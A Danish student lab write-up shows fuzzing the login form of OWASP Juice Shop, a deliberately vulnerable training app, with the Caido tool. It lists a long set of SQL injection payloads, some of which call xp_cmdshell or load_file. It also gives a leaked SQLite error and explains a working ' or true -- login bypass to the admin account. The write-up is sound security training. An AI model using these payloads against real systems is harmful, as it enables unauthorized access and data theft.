# Spørgsmål 1 - Demonstration af Fuzzing

## Juice shop

Jeg vil gerne fuzze Juice shops login side for at finde SQL sårbarheder.

Jeg starter med at opfange en login request til ``
Derefter sender jeg den request til Automate i caido, og fuzzer med denne SQL payload liste:

??? note "SQL liste"

    ```text
    )%20or%20('x'='x
    %20or%201=1
    ; execute immediate 'sel' || 'ect us' || 'er'
    benchmark(10000000,MD5(1))#
    update
    ";waitfor delay '0:0:__TIME__'--
    1) or pg_sleep(__TIME__)--
    ||(elt(-3+5,bin(15),ord(10),hex(char(45))))
    "hi"") or (""a""=""a"
    delete
    like
    " or sleep(__TIME__)#
    pg_sleep(__TIME__)--
    *(|(objectclass=*))
    declare @q nvarchar (200) 0x730065006c00650063 ...
    or 0=0 #
    insert
    1) or sleep(__TIME__)#
    ) or ('a'='a
    ; exec xp_regread
    *|
    @var select @var as var into temp end --
    1)) or benchmark(10000000,MD5(1))#
    asc
    (||6)
    "a"" or 3=3--"
    " or benchmark(10000000,MD5(1))#
    # from wapiti
    or 0=0 --
    1 waitfor delay '0:0:10'--
    or 'a'='a
    hi or 1=1 --"
    or a = a
    UNION ALL SELECT
    ) or sleep(__TIME__)='
    )) or benchmark(10000000,MD5(1))#
    hi' or 'a'='a
    0
    21 %
    limit
    or 1=1
    or 2 > 1
    ")) or benchmark(10000000,MD5(1))#
    PRINT
    hi') or ('a'='a
    or 3=3
    ));waitfor delay '0:0:__TIME__'--
    a' waitfor delay '0:0:10'--
    1;(load_file(char(47,101,116,99,47,112,97,115, ...
    or%201=1
    1 or sleep(__TIME__)#
    or 1=1
    and 1 in (select var from temp)--
    or '7659'='7659
    or 'text' = n'text'
    --
    or 1=1 or ''='
    declare @s varchar (200) select @s = 0x73656c6 ...
    exec xp
    ; exec master..xp_cmdshell 'ping 172.10.1.255'--
    3.10E+17
    " or pg_sleep(__TIME__)--
    x' AND email IS NULL; --
    &
    admin' or '
    or 'unusual' = 'unusual'
    //
    truncate
    1) or benchmark(10000000,MD5(1))#
    \x27UNION SELECT
    declare @s varchar(200) select @s = 0x77616974 ...
    tz_offset
    sqlvuln
    "));waitfor delay '0:0:__TIME__'--
    ||6
    or%201=1 --
    %2A%28%7C%28objectclass%3D%2A%29%29
    or a=a
    ) union select * from information_schema.tables;
    PRINT @@variable
    or isNULL(1/0) /*
    26 %
    ' or ''='
    ' or 3=3
    or 3=3 --
    ' or true --
    ```

Inde i automate setter jeg den email fra den originale request som en placeholder, så den bliver erstattet med mine payloads.

![SQL fuzzing](SQL_fuzzing.png)

Så starter jeg automate som går igennem alle linjer i filen og bruger det som payload.

Den modtager flere forskellige responce koder tilbage, så som `200 OK`, `401 Unauthorized`, og `500 Internal Server Error`. 401 betyder at den godtog et payload som en valid email, men den matchede ikke nogle brugere i databasen. 500 betyder at serveren løb in i en fejl, i dette tilfælde er det en SQL fejl, som kan ses i kode feltet under:

```json
{
    "error": {
        "message": "SQLITE_ERROR: near \"' AND password = '\": syntax error",
        "stack": "Error\n    at Database.<anonymous> (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /juice-shop/node_modules/sequelize/lib/sequelize.js:315:28\n    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)",
        "name": "SequelizeDatabaseError",
        "parent": {
            "errno": 1,
            "code": "SQLITE_ERROR",
            "sql": "SELECT * FROM Users WHERE email = '' or 3=3' AND password = 'deb7ee3b1fbb322b7547a72d42659c7b' AND deletedAt IS NULL"
        },
        "original": {
            "errno": 1,
            "code": "SQLITE_ERROR",
            "sql": "SELECT * FROM Users WHERE email = '' or 3=3' AND password = 'deb7ee3b1fbb322b7547a72d42659c7b' AND deletedAt IS NULL"
        },
        "sql": "SELECT * FROM Users WHERE email = '' or 3=3' AND password = 'deb7ee3b1fbb322b7547a72d42659c7b' AND deletedAt IS NULL",
        "parameters": {}
    }
}
```

Her kan man se fejlen som SQL databasen løber ind i, Den viser alt for meget information, og man kan endda se den SQL qurey som der bliver brugt til at tjekke om en bruger eksistere. Dette betyder også at der er SQL injection i denne login side, da bruger input bliver brugt direkte i den SQL query.

Jeg modtager også 3 responces som giver `200 OK`, hvilket betyder at databasen faktisk godtager det payload som valide SQL kommandoer.

![SQL result](SQL_fuzzing_result.png)

Som det kan ses på billedet her, så står der `' or true --` i email feltet, hvilket betyder at den først lukker og kommer ud af de quotes som bliver passet som email; `email = ''` og bruger `or true --` som betyder at den kigger efter alt i Users tabellen hvor email er en tom string eller sandt, og da true altid er sandt retunere den, den første bruger der blev lavet som i dette tilfælde er admin brugeren.

`SELECT * FROM Users WHERE email = '' or true --` resten af den query bliver commenteret ud
`AND password = 'deb7ee3b1fbb322b7547a72d42659c7b' AND deletedAt IS NULL`